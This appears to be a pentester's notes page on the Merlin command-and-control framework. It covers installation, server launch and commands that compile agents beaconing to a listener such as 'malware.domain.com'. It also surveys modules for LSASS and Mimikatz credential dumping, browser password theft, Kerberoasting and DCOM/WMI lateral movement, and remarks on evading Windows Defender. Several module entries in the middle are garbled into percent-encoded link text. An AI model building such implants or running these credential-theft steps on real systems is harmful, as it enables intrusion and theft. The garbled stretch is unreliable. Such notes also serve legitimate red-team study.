---
description: 'https://github.com/Ne0nd0g/merlin'
---

# Merlin

## Installation

### Install GO

```text
#Download GO package from: https://golang.org/dl/
#Decompress the packe using:
tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz

#Change /etc/profile
Add ":/usr/local/go/bin" to PATH
Add "export GOPATH=$HOME/go"
Add "export GOBIN=$GOPATH/bin"

source /etc/profile
```

### Install Merlin

```text
go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
cd $GOPATH/src/github.com/Ne0nd0g/merlin/
```

## Launch Merlin Server

```text
go run cmd/merlinserver/main.go -i
```

## Merlin Agents

You can [download precompiled agents](https://github.com/Ne0nd0g/merlin/releases)

### Compile Agents

Go to the main folder _$GOPATH/src/github.com/Ne0nd0g/merlin/_

```text
#User URL param to set the listener URL
make #Server and Agents of all
make windows #Server and Agents for Windows
make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
```

### **Manual compile agents**

```text
GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
```

## Modules

**The bad news is that every module used by Merlin is downloaded from the source \(github\) and saved indisk before using it. Forge about usingwell known modules because Windows Defender will catch you!**

**SafetyKatz** --&gt; Modified Mimikatz. Dump LSASS to file and launch:sekurlsa::logonpasswords to that file  
**SharpDump** --&gt; minidump for the process ID specified \(LSASS by default\) \(Itsais that the extension of the final file is .gz but indeed it is.bin, but is agz file\)  
**SharpRoast** --&gt;Kerberoast \(doesn't work\)  
**SeatBelt** --&gt; Local Security Tests in CS \(does not work\) [https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs](https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs)  
**Compiler-CSharp** --&gt; Compile using csc.exe /unsafe  
**Sharp-Up** --&gt;Allchecks in C\# in powerup \(works\)  
**Inveigh** --&gt; PowerShellADIDNS/LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool \(doesn't works, need to load: [https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1\](https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1%29%29%20%20
**Invoke-InternalMonologue**%20-->%20impersonates%20all%20available%20users%20and%20retrieves%20a%20challenge-response%20for%20each%20%28NTLM%20hash%20for%20each%20user%29%20%28bad%20url%29%20%20
**Invoke-PowerThIEf**%20-->%20Steal%20forms%20from%20IExplorer%20or%20make%20it%20execute%20JS%20or%20inject%20a%20DLL%20in%20that%20process%20%28doesnt%20work%29%20%28and%20the%20PS%20looks%20like%20doesnt%20work%20either\) [https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1](https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1)  
**LaZagneForensic** --&gt; Get browser passwords \(works but dont prints the output directory\)  
**dumpCredStore** --&gt; Win32 Credential Manager API \([https://github.com/zetlen/clortho/blob/master/CredMan.ps1\](https://github.com/zetlen/clortho/blob/master/CredMan.ps1%29\) [https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details](https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details)  
**Get-InjectedThread** --&gt; Detect classic injection in running processes \(Classic Injection \(OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread\)\) \(doesnt works\)  
**Get-OSTokenInformation** --&gt; Get Token Info of the running processes and threads \(User, groups, privileges, owner… [https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token\_information\_class\](https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-_token_information_class%29%29%20%20
**Invoke-DCOM**%20-->%20Execute%20a%20command%20%28inother%20computer\) via DCOM \([http://www.enigma0x3.net.\](http://www.enigma0x3.net.%29\) \([https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/\](https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/%29%29%20%20
**Invoke-DCOMPowerPointPivot**%20-->%20Execute%20a%20command%20in%20othe%20PC%20abusing%20PowerPoint%20COM%20objects%20%28ADDin%29%20%20
**Invoke-ExcelMacroPivot**%20-->%20Execute%20a%20command%20in%20othe%20PC%20abusing%20DCOM%20in%20Excel%20%20
**Find-ComputersWithRemoteAccessPolicies**%20-->%20%28not%20working\) \([https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/\](https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/%29%29%20%20
**Grouper**%20-->%20It%20dumps%20all%20the%20most%20interesting%20parts%20of%20group%20policy%20and%20then%20roots%20around%20in%20them%20for%20exploitable%20stuff.%20%28deprecated%29%20Take%20a%20look%20at%20Grouper2,%20looks%20really%20nice%20%20
**Invoke-WMILM**%20-->%20WMI%20to%20move%20laterally%20%20
**Get-GPPPassword**%20-->%20Look%20for%20groups.xml,%20scheduledtasks.xml,%20services.xmland%20datasources.xml%20and%20returns%20plaintext%20passwords%20%28insidedomain%29%20%20
**Invoke-Mimikatz**%20-->%20Use%20mimikatz%20%28default%20dump%20creds\)  
**PowerUp** --&gt; [https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)  
**Find-BadPrivilege** --&gt; Check the privileges of users in computers  
**Find-PotentiallyCrackableAccounts** --&gt; retrieve information about user accounts associated with SPN \(Kerberoasting\)  
**psgetsystem** --&gt; getsystem

**Didn't check persistence modules**

## Resume

I really like the feeling and the potential of the tool.  
I hope the tool will start downloading the modules from the server and integrates some kind of evasion when downloading scripts.

